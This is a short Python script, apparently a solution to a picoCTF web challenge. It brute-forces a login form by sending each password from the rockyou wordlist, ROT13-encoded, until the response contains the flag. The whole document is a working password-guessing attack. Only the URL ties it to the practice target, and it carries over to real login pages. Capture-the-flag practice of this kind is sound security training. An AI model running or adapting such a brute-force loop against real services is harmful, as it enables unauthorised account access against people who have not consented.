#!/usr/bin/env python3
import requests
import codecs

url = 'https://jupiter.challenges.picoctf.org/problem/54253/login.html'
for line in open('/usr/share/wordlists/rockyou.txt','r'):
	line = line.strip()
	rot = codecs.encode(line,'rot-13')
	data = {'password':rot,'debug':'0'}
	r = requests.post(url,data=data)
	print(f"Trying: {line}; ROT13: {rot}; Status Code: {r.status_code}")

	if ('picoCTF{' in r.text):
		break

print(r.text)